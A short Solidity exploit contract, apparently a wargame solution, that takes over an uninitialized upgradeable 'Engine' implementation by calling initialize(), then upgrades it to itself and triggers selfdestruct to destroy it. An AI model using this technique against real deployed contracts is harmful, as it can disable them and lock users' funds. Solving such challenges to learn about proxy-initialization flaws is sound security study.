//SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

//implementation address: 0x240516574f3d84b249549be642eefdd32ce7b3d0

interface IEngine {
    function upgrader() external view returns (address);

    function initialize() external;

    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable;
}

contract Hack {
    function Attack(IEngine target) external {
        //after this the hack contract will be the upgrader
        target.initialize();
        target.upgradeToAndCall(
            address(this),
            abi.encodeWithSelector(this.kill.selector)
        );
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}
